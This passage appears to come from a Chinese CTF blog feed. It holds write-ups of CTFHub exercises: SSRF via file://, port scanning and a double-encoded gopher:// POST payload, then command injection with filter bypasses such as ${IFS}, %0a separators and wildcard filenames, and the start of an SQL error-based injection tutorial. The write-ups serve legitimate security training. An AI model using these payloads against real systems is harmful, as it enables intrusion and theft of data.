class="line">http://challenge-2faad2126ffe77a6.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172034612.png" alt="image-20211117203414561"></p><p>拿到flag</p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>查看题目：端口扫描。题目描述：来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172036472.png" alt="image-20211117203617368"></p><p>如题可知，我们需要从端口8000~9000中间找到对的端口，拿到flag。</p><p>这里我们直接用burpsuite进行抓包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=127.0.0.1:8000       //url后面的url参数</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172139888.png" alt="image-20211117213950803"></p><p>抓到包之后把数据包传到测试器Intruder</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172140501.png" alt="image-20211117214035422"></p><p>然后为127.0.0.1:8000中的8000添加成一个payload</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172142521.png" alt="image-20211117214254436"></p><p>然后设置载荷集，从8000开始，逐一递增至9000结束。</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172144272.png" alt="image-20211117214429184"></p><p>然后得到一个返回包长度不一样的即为我们想要的端口号，里面存有flag</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172146999.png" alt="image-20211117214651915"></p><p>这里也可以用dict来探测端口的指纹信息，根据长度不同也可以判断出有flag(这里我重置了一下环境，所以扫到的flag的端口换了一下)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181351434.png" alt="image-20211118135135337"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181352534.png" alt="image-20211118135205424"></p><p>去google浏览器中文翻译一下</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181353105.png" alt="image-20211118135321027"></p><p>可以看到端口8526有开启apache的web服务，上面是指纹信息，不过这里看不到flag，要把”dict://“去掉或者换成”http://“来访问该端口，即可得到flag，dict只是用来探测端口的开放情况。</p><h3 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h3><p>题目：POST请求。题目描述：这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181433028.png" alt="image-20211118143358925"></p><p>描述中说要发一个POST请求，而且又提到了curl。百度了一下，curl是支持gopher协议的，而且gopher可以发送POST请求，所以可能是利用gopher来解题。(这题网上说302.php被删掉了，而且后面扫描web目录的时候确实没发现302.php，所以就不管这个302.php了)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181441578.png" alt="image-20211118144142496"></p><p>进入题目之后，网页一片空白，源代码也没有什么东西。那首先我们先用”127.0.0.1”替换掉”_”，然后用dirsearch扫一下web目录</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181445026.png" alt="image-20211118144508939"></p><p>然后发现了两个东西：index.php和flag.php，而index.php是默认主页，被重定向到/?url=_，也就是我们一开始点进去的默认网页。</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181448480.png" alt="image-20211118144858403"></p><p>那我们访问一下flag.php</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=127.0.0.1/flag.php//url后面的url参数</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181450589.png" alt="image-20211118145000498"></p><p>发现有一个输入框，然后我们看到源码有个注释：”key=98e7725c8992ee446316ea02eff8ff0f”</p><p>大概可以想到，我们需要提交一个POST请求，带上”key=98e7725c8992ee446316ea02eff8ff0f”参数</p><p>所以现在我们要做的是：</p><ul><li><p>gopher协议格式：URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流(这个下划线”_“是因为gopher协议会吃掉第一个字符，所以要先放一个没有用的字符，什么字符都行)</p></li><li><p>构造标准的POST请求</p></li><li><p>对请求进行URL编码，并且回车换行需要把%0A改成%0D%0A(gopher协议格式)</p></li><li><p>然后对已经URL编码后的请求再进行一次URL编码(<strong>因为浏览器会做一次URL的解码，%20等字符已经被转码为空格，而发起gopher时需要用的是URL编码的值，也就是要以一次编码的形式传入函数里进行第二次请求，服务器又解码一次才变成我们正常所能理解的网页请求，但是现在已经被解码回原来的样子，原来有特殊字符的请求服务器是不认定的，所以这里我们进行两次URL编码的目的是，抵消掉浏览器的一次解码，这样后面的POST参数写进gopher协议的时候就会用到一次URL编码的值，刚好服务器又把协议里的编码值解码，就收到正常的网页请求</strong>。如果有两个”?”，说明会多一次跳转，有两个URL解码的过程，这时候就要进行三次URL编码了，<a href="https://blog.csdn.net/rfrder/article/details/108589988">相关链接</a>)</p></li><li><p>根据gopher协议格式，把编码后的请求内容粘贴到TCP数据流的位置中</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111182132080.png" alt="image-20211118213212969"></p><p>所以我们先构造一个标准的POST请求</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:80</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 36</span><br><span class="line"></span><br><span class="line">key=98e7725c8992ee446316ea02eff8ff0f</span><br></pre></td></tr></table></figure><p>其中，上面的四个参数：POST、Host、Content-Type、Content-Length是POST请求必须的，如果少了会报错，但是GET请求就不需要这么多。而且Content-Length应为字符串“key=98e7725c8992ee446316ea02eff8ff0f”的长度</p><p>然后在HackBar中对上述构造的POST请求进行URL编码</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181457623.png" alt="image-20211118145716511"></p><p>注意编码后要在每个%0A前面添加%0D</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181539451.png" alt="image-20211118153954391"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">POST%</span><span class="bash">20%2fflag.php%20HTTP%2f1.1%0D%0AHost:%20127.0.0.1:80%0D%0AContent-Type:%20application%2fx-www-form-urlencoded%0D%0AContent-Length:%2036%0D%0A%0D%0Akey=98e7725c8992ee446316ea02eff8ff0f</span></span><br></pre></td></tr></table></figure><p>然后再把上述编码后的POST请求再进行一次URL编码，得到如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">POST%</span><span class="bash">2520%252fflag.php%2520HTTP%252f1.1%250D%250AHost:%2520127.0.0.1:80%250D%250AContent-Type:%2520application%252fx-www-form-urlencoded%250D%250AContent-Length:%252036%250D%250A%250D%250Akey=98e7725c8992ee446316ea02eff8ff0f</span></span><br></pre></td></tr></table></figure><p>然后就可以通过gopher协议的格式，在url栏提交POST请求</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-5eeccc951ae08152.sandbox.ctfhub.com:10800/?url=gopher://127.0.0.1:80/_POST%2520%252fflag.php%2520HTTP%252f1.1%250D%250AHost:%2520127.0.0.1:80%250D%250AContent-Type:%2520application%252fx-www-form-urlencoded%250D%250AContent-Length:%252036%250D%250A%250D%250Akey=98e7725c8992ee446316ea02eff8ff0f</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181513272.png" alt="image-20211118151339193"></p><p>flag就出来了，当然也可以通过burpsuite先抓到普通的包，然后修改GET后面的内容</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181513384.png" alt="image-20211118151306270"></p><p>注意这里得到的是一个假flag，而且上面提示重启题目环境，这是一个假的网页，因为我搞错了。。。</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181517170.png" alt="image-20211118151746087"></p><p>这才是真正的flag和网页。。所以做题一定要注意！！！</p>]]></content>
    
    
    <summary type="html">CTFHub技能树上的SSRF基础题</summary>
    
    
    
    <category term="CTFHub" scheme="https://jason177.com/categories/CTFHub/"/>
    
    
    <category term="SSRF" scheme="https://jason177.com/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub-RCE</title>
    <link href="https://jason177.com/2021/11/15/rce/"/>
    <id>https://jason177.com/2021/11/15/rce/</id>
    <published>2021-11-15T08:39:38.000Z</published>
    <updated>2021-11-15T08:40:00.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CTFHub-RCE"><a href="#CTFHub-RCE" class="headerlink" title="CTFHub-RCE"></a>CTFHub-RCE</h1><div class="note blue icon flat"><i class="note-icon fas fa-bullhorn"></i><p>题目位置：CTFHub-&gt;技能树-&gt;Web-&gt;RCE-&gt;命令注入</p></div><div class="note success disabled"><p><a href="https://www.ctfhub.com/">CTFHub官网</a></p></div><p>该篇文章主要是记录CTFHub中的RCE-命令注入的几道题目的解法</p><hr><h2 id="开始解题"><a href="#开始解题" class="headerlink" title="开始解题"></a>开始解题</h2><h3 id="一、命令注入"><a href="#一、命令注入" class="headerlink" title="一、命令注入"></a>一、命令注入</h3><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151652485.png" alt="image-20211115165215333"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151659895.png" alt="image-20211115165932817"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151700760.png" alt="image-20211115170020703"></p><p>这里可以使用Linux的命令拼接。</p><p><a href="https://blog.csdn.net/weixin_43326436/article/details/106719844">相关链接</a></p><p><a href="https://blog.csdn.net/JBlock/article/details/88311388">相关链接</a></p><p>LINUX系统的管道符:</p><ol><li>“ ; “: 执行完前面的语句在执行后面的语句。</li><li>“ | “: 显示后面的语句的执行结果。</li><li>” || “：当前的语句执行出错时，执行后面的语句。</li><li>” &amp; “：两条命令都执行，如果前面语句为假则执行后面的语句，前面的语句可真可假。放在启动参数后面表示设置此进程为后台进程，默认情况下，进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作，对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个’&amp;’实现这个目的。进程切换到后台的时候，我们把它称为job(没看懂)</li><li>” &amp;&amp; “：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则执行两条命令，前面的语句只能为真。</li></ol><p>这里可以使用”&amp;”、”|”、”||”或者”;”</p><p>这里我们使用分号”;”来拼接指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151712717.png" alt="image-20211115171211662"></p><p>发现有个24583193744971.php文件，用cat进行查看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cat 24583193744971.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151713501.png" alt="image-20211115171301428"></p><p>发现什么都没有显示，如果不是cat过滤了的话那就是24583193744971.php文件内容里面有注释符什么的，导致在html页面中无法正常显示里面的内容，此时查看源码。</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151715541.png" alt="image-20211115171503458"></p><p>发现flag。</p><p>也可以使用base64和管道符”|”来把内容变成base64，然后利用base64解码，来解出文件内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cat 24583193744971.php | base64</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151717362.png" alt="image-20211115171720268"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151717086.png" alt="image-20211115171734993"></p><p>得到flag</p><hr><h3 id="二、过滤cat"><a href="#二、过滤cat" class="headerlink" title="二、过滤cat"></a>二、过滤cat</h3><p><a href="https://blog.csdn.net/szgyunyun/article/details/104970118">相关链接</a></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151943529.png" alt="image-20211115194303434"></p><p>思路：代替cat</p><blockquote><p>cat 由第一行开始显示内容，并将所有内容输出</p><p>tac 从最后一行倒序显示内容，并将所有内容输出</p><p>more 根据窗口大小，一页一页的现实文件内容</p><p>less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符</p><p>head 只显示头几行</p><p>tail 只显示最后几行</p><p>nl 类似于cat -n，显示时输出行号</p><p>tailf 类似于tail -f</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151722727.png" alt="image-20211115172236635"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;head flag文件名</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151723660.png" alt="image-20211115172310562"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151723874.png" alt="image-20211115172316809"></p><p>用ca\t也可以绕过(我丢，这是为啥啊)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ca\t flag文件名</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151938832.png" alt="image-20211115193832734"></p><p>同样源代码可以看到flag</p><hr><h3 id="三、过滤空格"><a href="#三、过滤空格" class="headerlink" title="三、过滤空格"></a>三、过滤空格</h3><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151940961.png" alt="image-20211115194032853"></p><p>通常我们可以用&lt;,&lt;&gt;, ${IFS},  $IFS，%20(space),  %09(tab),  $IFS$9来替代空格(该小题下面讲述IFS的意思)</p><p>测试了一下，这题&lt;&gt;,%20,%09不能用，其它都可以</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cat&lt;flag文件名</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151944627.png" alt="image-20211115194437540"></p><p>同样查看源码即可获得flag</p><p>而如果在sql注入中，绕过过滤空格的话则通常利用注释/**/来绕过。(当然还有其他方法，%20什么的)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select user() from dual</span><br><span class="line"></span><br><span class="line">select/**/user()/**/from/**/dual</span><br></pre></td></tr></table></figure><hr><p>IFS在linux中表示 Internal Field Separator （内部字段分隔符）</p><p>$IFS是内部字段分隔符的缩写。它决定Bash解析字符串时将怎样识别字段，或单词分界线。默认为（空格、制表符、换号）</p><p>例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">IFS=:  //定义内部字段分隔符为: 默认为空格</span></span><br><span class="line"><span class="meta">$</span><span class="bash">a=Hello:World</span></span><br><span class="line"><span class="meta">$</span><span class="bash"><span class="built_in">echo</span> <span class="variable">$a</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;Hello World//a变量中的:被指定为了内部字段分隔符，所以变成空格</span></span><br></pre></td></tr></table></figure><p>假如需要迭代一个字符串或csv（Comma Separtor value，逗号分隔型数值）中的单词。</p><p>对于字符串，定界符IFS一般用“.”。而csv文件，定界符IFS一般用”,“。</p><p>当IFS被设置为逗号时，shell将逗号解释成一个定界符，因此变量$item在每次迭代时读取由逗号分隔的字符串作为变量值。</p><hr><h3 id="四、过滤目录分隔符"><a href="#四、过滤目录分隔符" class="headerlink" title="四、过滤目录分隔符"></a>四、过滤目录分隔符</h3><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151956943.png" alt="image-20211115195602861"></p><p>看代码可以知道，已经把”/“和”\“过滤掉了</p><p>先查看文件夹名字</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151956255.png" alt="image-20211115195646165"></p><p>flag应该放在flag_is_here文件夹下面，首先我们可以利用拼接指令的方法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cd flag_is_here;ls      //查看文件夹中的文件</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111152000144.png" alt="image-20211115200038079"></p><p>果然有个文件叫flag_297861214225622.php，接下来老样子，用cat查看文件内容然后查看源码就行了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cd flag_is_here;cat flag_297861214225622.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111152002576.png" alt="image-20211115200200499"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111152002841.png" alt="image-20211115200207780"></p><p>拿到flag</p><hr><h3 id="五、过滤运算符"><a href="#五、过滤运算符" class="headerlink" title="五、过滤运算符"></a>五、过滤运算符</h3><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111152005664.png" alt="image-20211115200540577"></p><p>过滤了这么多运算符…但是没什么卵用。老样子，用分号”;”来拼接就行了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls</span><br><span class="line"></span><br><span class="line">127.0.0.1;cat flag文件名</span><br></pre></td></tr></table></figure><p>这里就不上图了</p><p>还有一种方法是之前的file | base64写成base64 file，输出base64编码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;base64 flag文件名</span><br></pre></td></tr></table></figure><hr><h3 id="六、综合过滤练习"><a href="#六、综合过滤练习" class="headerlink" title="六、综合过滤练习"></a>六、综合过滤练习</h3><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111152029525.png" alt="image-20211115202906438"></p><p>看题可知，该题目过滤了”|”，”&amp;”，”;”，” “，”/“，”cat”,”flag”,”ctfhub”</p><p>我们空格可以用$(IFS)，这里用&gt;不行，其它的没试</p><p>cat用head(其它的也行)</p><p>flag用正则表达式f***，fl$*ag也可以(不知道啥意思)，很多种方法</p><p>linux下命令分隔符除了”;”，还能用%0a,%0d,%0D%0A替代(注意这是url编码后的符号，所以我们要用burpsuite抓完包之后把需要分隔符的地方修改成%0a，或者在url地址栏中填写，以下使用burpsuite方便一点)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;ls</span><br></pre></td></tr></table></figure><p>提交之后burpsuite抓包，然后发到重发器，修改&amp;的url编码%26为%0a</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111152044446.png" alt="image-20211115204435331"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1%0als</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111152045233.png" alt="image-20211115204516111"></p><p>右边就会显示文件夹的名字了，如果是在浏览器上</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111152054756.png" alt="image-20211115205446668"></p><p>然后我们通过${IFS}代表空格，正则表达式f***_is_here匹配到flag_is_here，回显文件名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1%0acd$&#123;IFS&#125;f***_is_here%0als</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111152047746.png" alt="image-20211115204715610"></p><p>用head代替cat，f***_8938535132164.php代替flag_8938535132164.php</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1%0acd$&#123;IFS&#125;f***_is_here%0ahead$&#123;IFS&#125;f***_8938535132164.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111152050630.png" alt="image-20211115205034523"></p><p>得到flag</p>]]></content>
    
    
    <summary type="html">CTFHub技能树上的RCE命令注入基础题</summary>
    
    
    
    <category term="CTFHub" scheme="https://jason177.com/categories/CTFHub/"/>
    
    
    <category term="RCE" scheme="https://jason177.com/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>SQL-报错注入</title>
    <link href="https://jason177.com/2021/10/11/sql-error-inject/"/>
    <id>https://jason177.com/2021/10/11/sql-error-inject/</id>
    <published>2021-10-11T11:55:10.000Z</published>
    <updated>2021-10-19T12:11:00.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="SQL-报错注入"><a href="#SQL-报错注入" class="headerlink" title="SQL-报错注入"></a>SQL-报错注入</h1><p>当把sql语句带入查询之后，返回的页面正确，但是没有返回点时，用echo mysql_error()在页面输出错误信息。</p><div class="note warning simple"><p>报错注入速度比较快，但是floor()不能用group_concat()一次性输出数据库名、表名或字段名,只能用limit，下面演示的时候会提到</p><p>高版本的MYSQL8.*已经修复了报错注入这个bug，所以此SQL报错注入只适用于MYSQL5.*</p></div><h2 id="常用三种报错注入"><a href="#常用三种报错注入" class="headerlink" title="常用三种报错注入"></a>常用三种报错注入</h2><ul><li>floor()</li><li>updatexml()</li><li>extractvalue()</li></ul><blockquote><p>该篇主要先讲SQL报错注入时常用的几个函数和SQL语句的原理以及使用。最后利用floor()、updatexml()、extractvalue()对CTFHub上的题目进行报错注入。因为篇幅较长，所以不会讲SQL手工注入基本语句的大概意思，只会讲SQL-报错注入的原理和利用，然后演示一遍。如果看不懂手工注入基本语句，请自行Google</p></blockquote><blockquote><p>MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是updatexml()和extractvalue()</p></blockquote><hr><h2 id="函数解析及floor"><a href="#函数解析及floor" class="headerlink" title="函数解析及floor()"></a>函数解析及floor()</h2><p>在讲floor()函数的同时，还要简单讲一下三个SQL函数和语句：count(*)、rand()、group by。然后updatexml()和extractvalue()函数的解析后面做题的时候再作解释，也可直接在右边目录中直接跳到想要看的函数解析。</p><blockquote><p>count(*)</p><p>返回在给定的选择中被选的行数。</p></blockquote><blockquote><p>rand()/rand(0)</p><p>rand()</p><p>产生0~1的随机数，所以rand()*2就是产生0~2的随机数，没有规律。</p><p>rand(0)</p><p>函数中加了随机因子之后，就变成了伪随机数，也就是有规律地产生随机数。rand(0)*2就是产生0~2的有规律的随机数。</p></blockquote><blockquote><p>concat()</p><p>连接参数产生的字符串,如有任何一个参数为NULL ,则返回值为 NULL</p></blockquote><blockquote><p>floor()</p><p>对参数的数值进行向下取整，相当于去除小数点部分，保留整数</p></blockquote><blockquote><p>group by</p><p>用来结合聚合函数(这里和count一起使用)，根据一个或多个列对结果进行分组，后面演示的时候会具体介绍</p></blockquote><p>文字介绍还不如直接用数据库来演示一遍</p><p>附上参考链接：<a href="https://blog.51cto.com/wt7315/1891458">报错型sql注入原理分析</a></p><hr><h2 id="rand"><a href="#rand" class="headerlink" title="rand()"></a>rand()</h2><p>首先是rand()函数，就是产生0~1的随机数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select rand();</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110120928210.png" alt="image-20211012092818075"></p><p>如果是rand()*2，则取值范围就是：0*2~1*2，也就是<strong>0~2</strong></p><hr><h2 id="rand-amp-floor"><a href="#rand-amp-floor" class="headerlink" title="rand()&amp;floor()"></a>rand()&amp;floor()</h2><p>原本对rand()向下取整的话，floor(rand())恒为0，但是我们利用floor()对rand()*2进行向下取整，即floor(rand()*2)，则取值就变成了0或1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select floor(rand()*2);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110120934090.png" alt="image-20211012093445981"></p><p>在这里我们可以利用information_schema(MYSQL自带数据库)的schemata表来比较一下rand()*2和rand(0)*2的不同。(这里只是利用schemata表的行数来显示rand随机数，与表内容无关)</p><blockquote><p>rand()*2</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select floor(rand()*2) from information_schema.schemata</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121554830.png" alt="image-20211012155445770"></p><blockquote><p>rand(0)*2</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select floor(rand(0)*2) from information_schema.schemata</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121555785.png" alt="image-20211012155520718"></p><p>可以看到rand(0)*2确实是有规律的伪随机数，而rand()*2是没有规律的随机数，每次查询都是不同的顺序。因为rand(0)*2的确定性，所以<strong>SQL报错注入一般都用rand(0)*2(下面会讲)</strong></p><hr><h2 id="rand-amp-floor-amp-concat"><a href="#rand-amp-floor-amp-concat" class="headerlink" title="rand()&amp;floor()&amp;concat()"></a>rand()&amp;floor()&amp;concat()</h2><p>然后我们可以结合database()用来回显当前数据库的名称，concat()函数可以将多个字符串连接成一个字符串(如果有一个参数为null，则返回值为null)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(0x7e7e,database(),0x7e7e,floor(rand()*2))name;   </span><br></pre></td></tr></table></figure><p><strong>0x开头表示十六进制，0x7e在十六进制中是”~”，concat后面加name用来对查询字段重命名为”name”</strong></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110120949887.png" alt="image-20211012094904821"></p><p>可以看到第一次查询拼接之后的字符串为”~~sql-error-inject~~0”，第二次查询拼接之后的字符串为”~~sql-error-inject~~1”。数据库为”sql-error-inject”，floor(rand()*2)的随机数第一次为0，第二次为1</p><p>我们可以利用information_schema的tables表来显示一下前面几列的具体内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(0x7e7e,database(),0x7e7e,floor(rand()*2))name from information_schema.tables;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121551760.png" alt="image-20211012155117571"></p><p>然后我们再用group by语句和聚合函数来对上述内容进行分组和统计求和。</p><p>这里要说一下group by和聚合函数的原理。</p><hr><h2 id="group-by-amp-聚合函数原理"><a href="#group-by-amp-聚合函数原理" class="headerlink" title="group by&amp;聚合函数原理"></a>group by&amp;聚合函数原理</h2><p>参考链接：<a href="https://zhuanlan.zhihu.com/p/46869970">group by的理解</a></p><p>如果只使用group by语句，首先系统会根据SELECT语句得到一个结果集，然后根据分组字段，将具有相同分组字段的记录归并成一条记录，这个时候剩下的那些不存在于Group By语句后面作为分组依据的字段就有可能出现多个值，但是目前一种分组情况只有一条记录，一个数据格是无法放入多个数值的，所以这里就需要通过一定的处理将这些多值的列转化成单值，然后将其放在对应的数据格中，那么完成这个步骤的就是聚合函数</p><p>废话不多说，先拿图表来演示一遍</p><hr><p>首先存在一个表1：test</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121633095.png" alt="image-20211012163321047"></p><p>当我们在数据库中使用语句：FROM test Group By user，数据库会生成一个虚拟表，如下图所示。数据库会根据group by user，找到user字段，具有相同user值的行会合并成一行，没有相同值的就会自立一行。比如user值为jason的，&lt;1 jason 123&gt;和&lt;7 jason 789&gt;会合并成一行，user值为root的，&lt;2 root 123&gt;、&lt;4 root 456&gt;、&lt;8 root 123&gt;会合并成一行，其中id值和password值会写到一个单元格里面。</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202110121649689.png" alt="image-20211012164935607"></p><p>虽然画得挺丑，但是通俗易懂(牛批)从上图可以看出，通过user字段合并相同值之后，虚拟表总共有五行。</p><p>接下来数据库会针对虚拟表进行SELECT语句：</p><ol><li><p>如果执行select *，有些单元格里面id字段和password字段的内容有多个值，但是数据库中不允许单元格有多个值，所以在数据库里面执行select *语句会报错。</p></li><li><p>因为user字段的每个单元格只有一条数据，所以执行select  user是没有问题的。至于为什么user字段的每一个单元格只有一个值，是因为我们就是用user字段来group 